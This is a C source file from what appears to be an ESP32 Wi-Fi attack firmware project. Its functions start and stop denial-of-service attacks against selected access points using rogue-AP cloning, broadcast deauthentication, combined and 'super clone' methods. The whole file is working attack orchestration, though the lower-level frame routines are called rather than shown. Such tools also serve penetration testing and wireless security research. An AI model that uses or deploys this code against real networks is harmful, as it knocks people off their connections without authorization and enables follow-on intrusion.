/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com), SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 *
 * @brief Implements DoS attacks using deauthentication methods
 */

#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"


static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack on %d targets...", attack_config->target_count);
    method = attack_config->method;

    switch (method) {
        case ATTACK_DOS_METHOD_BROADCAST:
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            wifictl_mgmt_ap_stop();
            break;
        default:
            break;
    }

    for(int i = 0; i < attack_config->target_count; i++) {
        const wifi_ap_record_t *ap_record = attack_config->ap_records[i];

        switch(method) {
            case ATTACK_DOS_METHOD_ROGUE_AP:
                attack_method_rogueap(ap_record);
                break;
            case ATTACK_DOS_METHOD_BROADCAST:
                attack_method_broadcast(ap_record, 1);
                break;
            case ATTACK_DOS_METHOD_COMBINE_ALL:
                attack_method_rogueap(ap_record);
                attack_method_broadcast(ap_record, 1);
                break;
            case ATTACK_DOS_METHOD_SUPER_CLONE:
                attack_method_rogueap(ap_record);
                attack_method_super_clone(ap_record);
                break;
        }
    }
}

void attack_dos_stop() {
    switch(method){
        case ATTACK_DOS_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_SUPER_CLONE:
            attack_method_super_clone_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    ESP_LOGI(TAG, "DoS attack stopped");
}
